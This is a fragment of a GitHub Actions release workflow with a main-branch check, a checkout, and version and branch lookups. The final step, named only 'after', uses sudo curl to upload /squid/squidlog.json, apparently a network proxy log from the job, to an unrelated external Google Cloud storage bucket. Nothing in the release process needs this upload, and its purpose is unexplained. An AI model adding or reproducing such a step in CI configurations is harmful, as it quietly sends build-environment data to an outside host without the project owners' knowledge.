      if: ${{ github.event.inputs.release_type != 'Dry Run' }}
      name: Branch check
      run: "if [[ \"$GITHUB_REF\" != \"refs/heads/main\" ]]; then\n  echo \"===================================\"\
        \n  echo \"[!] Can only release from the 'main' branch\"\n  echo \"===================================\"\
        \n  exit 1\nfi\n"
    - continue-on-error: true
      name: Check out repo
      uses: actions/checkout@d632683dd7b4114ad314bca15554477dd762a938
    - continue-on-error: true
      id: version
      name: Get version
      run: 'VERSION=$(sed -nE ''s/^VERSION\s+\?=\s+([^\s]+)/\1/p'' Makefile)

        echo "version=$VERSION" >> $GITHUB_OUTPUT

        '
    - continue-on-error: true
      id: branch
      name: Get branch name
      run: 'BRANCH_NAME=$(basename ${{ github.ref }})

        echo "branch-name=$BRANCH_NAME" >> $GITHUB_OUTPUT

        '
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/bitwarden/sm-kubernetes.$(date
        +%s)
    timeout-minutes: 60
